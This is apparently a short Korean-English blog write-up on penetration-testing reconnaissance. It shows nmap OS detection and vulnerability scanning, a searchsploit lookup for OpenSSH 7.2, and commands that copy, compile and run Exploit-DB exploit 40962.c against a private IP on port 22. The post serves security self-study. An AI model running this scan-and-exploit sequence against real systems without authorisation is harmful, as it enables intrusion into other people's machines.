---
layout: post
title: "Nmap과 Searchsploit으로 취약점 익스"
categories: [SWING, Writeup, Self-study]
tags: [Nmap, Searchsploit, Vulnerability, Exploit]
last_modified_at: 2024-09-09
---

모의침투 테스트에서 타겟의 OS를 알아내는 것과 potential 취약점을 발견하는 건 중요한 단계입니다.

이 글에서는 Nmap으로 OS detection을 하고 Searchsploit으로 exploits based on detected vulnerabilities, including CVEs를 다룹니다.

1. **Using Nmap for OS Detection**  
   -O 옵션으로 Nmap을 사용하면 detect 가능  
   ```bash
   sudo nmap -O <target-ip>
   ```

2. **Scanning for Vulnerabilities with Nmap Scripts**  
   ```bash
   sudo nmap --script vuln <target-ip>
   ```

![Nmap Vulnerability Scanning](https://blog.kakaocdn.net/dna/bB2X0a/btsJuHKhZxU/AAAAAAAAAAAAAAAAAAAAAGNvBrB0PNGZgH_Qua9pdTadPkouMxK5nraF_h64u47C/img.jpg?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=wiCDSgOahTPNBh5AGtFDcmD6D%2B4%3D)

3. **Using Searchsploit to Find Exploits**  
위 steps에서 potential vulnerabilities를 찾았다면 searchsploit을 사용합니다.  
```bash
searchsploit <service> <version>
```

예시로...  
```bash
searchsploit openssh 7.2
```
입력하면...  
```
----------------------------------------- ----------------------------------------
 Exploit Title                           |  Path
----------------------------------------- ----------------------------------------
OpenSSH 7.2p1 - (Ubuntu 16.04.1) 'Accepted | /path/to/exploit.c
----------------------------------------- ----------------------------------------
```

위까지 툴을 썼고.. 이제 copy 후 compile, exec  
```bash
cp /usr/share/exploitdb/exploits/linux/remote/40962.c .

gcc 40962.c -o openssh_exploit

./openssh_exploit 192.168.1.10 22
```